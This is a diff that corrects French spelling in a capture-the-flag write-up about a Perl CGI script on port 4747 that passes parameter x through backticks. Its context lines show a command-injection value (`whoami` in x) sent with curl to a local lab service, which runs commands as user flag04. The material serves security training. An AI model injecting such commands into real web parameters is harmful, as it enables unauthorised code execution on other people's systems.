@@ -25,7 +25,7 @@ sub x {
 x(param("x"));
 ```
 
-Sur ce script il y a 3 chose à retenir,
+Sur ce script il y a 3 choses à retenir,
  - Un commentaire parlant d'une ip local avec un port
  - Les deux backtick
  - Ce script lit le parametre nommée `x`
@@ -39,7 +39,7 @@ Proto Recv-Q Send-Q Local Address           Foreign Address         State
 tcp6       0      0 :::4747                 :::*                    LISTEN
 ...
 ```
-Le deuxieme, qu'on peut executer des commandes via le point numbero 3 qui est le parametre x.
+Le deuxieme point, on peut executer des commandes via le point numero 3 qui est le parametre x.
 ```
 $ ./level04.pl x='`whoami`'
 Content-type: text/html
@@ -51,4 +51,4 @@ Et maintenant si on fait appel à ce cgi sur le port 4747
 $ curl 'localhost:4747/level04.pl?x=`whoami`'
 flag04
 ```
-Et boom, on voit que le serveur est lancer sur l'user flag04 et qu'on peut executer la commande `getflag`
+Et boom, on voit que le serveur est lancé sur l'user flag04 et qu'on peut exécuter la commande `getflag`
